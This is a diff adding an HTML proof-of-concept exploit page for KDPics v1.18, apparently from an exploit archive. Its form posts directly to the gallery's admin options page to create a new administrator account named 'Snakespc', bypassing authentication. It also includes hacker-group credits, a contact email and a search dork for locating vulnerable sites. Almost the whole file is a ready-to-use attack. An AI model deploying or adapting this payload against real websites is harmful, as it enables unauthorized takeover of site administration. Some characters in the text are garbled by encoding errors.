@@ -1,0 +1,43 @@
+
+&lt;html&gt;
+&lt;title&gt;G�n�r� par KDPics v1.18 Remote Add Admin&lt;/title&gt;
+ 
+&lt;body link=&quot;#00FF00&quot; text=&quot;#008000&quot; bgcolor=&quot;#000000&quot;&gt;
+ 
+&lt;form method=&quot;POST&quot; action=&quot;http://www.example.com/kdpics/admin/index.php3?page=options&amp;categorie=&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;type&quot; value=&quot;add&quot;&gt;
+&lt;table border=&quot;1&quot; cellpadding=&quot;4&quot; style=&quot;border-collapse: collapse&quot; width=&quot;100%&quot; bordercolor=&quot;#808080&quot;&gt;
+&lt;tr&gt;
+&lt;td class=&quot;top&quot;&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;b&gt;User &amp; Pass :Snakespc&lt;/b&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;b&gt;&lt;font face=&quot;Comic Sans MS&quot;&gt;
+&lt;a href=&quot;http://www.example.com//index.php?act=idx&quot; style=&quot;text-decoration: none&quot;&gt;
+&lt;font color=&quot;#00FF00&quot;&gt;[�]Founder:[ Snakespc Email:super_cristal@hotmail.com - Site:sec-war.com/cc&gt; ]&lt;/p&gt;
+[�] Greetz to:[ sec-warTeaM, PrEdAtOr ,alnjm33 &gt;&gt;&gt; All My Mamber &gt;&gt; sec-war.com/cc ]&lt;/p&gt;[�] Dork:&quot;G�n�r� par KDPics v1.18&quot;&lt;/font&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Username:&lt;/b&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td height=&quot;1&quot;&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;adminuser&quot; size=&quot;30&quot; value=&quot;Snakespc&quot;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td class=&quot;top&quot;&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Password:&lt;/b&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+ 
+&lt;td height=&quot;22&quot;&gt;
+&lt;p align=&quot;center&quot;&gt;
+&lt;input type=&quot;password&quot; name=&quot;adminpass&quot; size=&quot;30&quot; value=&quot;Snakespc&quot;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&quot;right&quot;&gt;
+&lt;p align=&quot;center&quot;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Add User &gt;&gt;&quot; style=&quot;font-weight: 700&quot;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/form&gt;
+&lt;/table&gt;
+&lt;/html&gt;
+
+
+
